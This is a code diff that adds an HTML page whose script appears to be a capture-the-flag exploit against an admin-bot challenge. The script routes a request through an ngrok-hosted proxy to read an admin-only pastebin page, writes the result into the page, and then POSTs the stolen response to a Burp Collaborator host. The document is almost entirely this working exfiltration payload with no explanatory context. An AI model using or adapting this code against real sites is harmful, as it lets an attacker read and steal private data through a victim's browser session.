@@ -1,0 +1,45 @@
+
+<script>
+  var cors_api_url = 'http://2f84ab2dda9f.ngrok.io/';
+  function doCORSRequest(options, printResult) {
+    var x = new XMLHttpRequest();
+    x.open(options.method, cors_api_url + options.url);
+    x.setRequestHeader("x-requested-with", "XMLHttpRequest")
+    x.onload = x.onerror = function() {
+      printResult(
+        options.method + ' ' + options.url + '\n' +
+        x.status + ' ' + x.statusText + '\n\n' +
+        (x.responseText || '')
+      );
+    };
+    if (/^POST/i.test(options.method)) {
+      x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    }
+    x.send(options.data);
+  }
+  doCORSRequest({
+        method: 'GET',
+        data: "asd",
+        url: "https://admin-bot.mc.ax/pastebin-1",
+        }, function printResult(result) {
+            document.write(result)
+            doCORSRequest({
+                url: "rfa4l60o0xz23wt6rn5uy2jtikoacz.burpcollaborator.net",
+                method: "POST",
+                data : result
+                }, function printResult(a) {
+            });
+    });
+
+    
+   
+
+    
+
+
+
+   
+    
+</script>
+</body>
+</html>
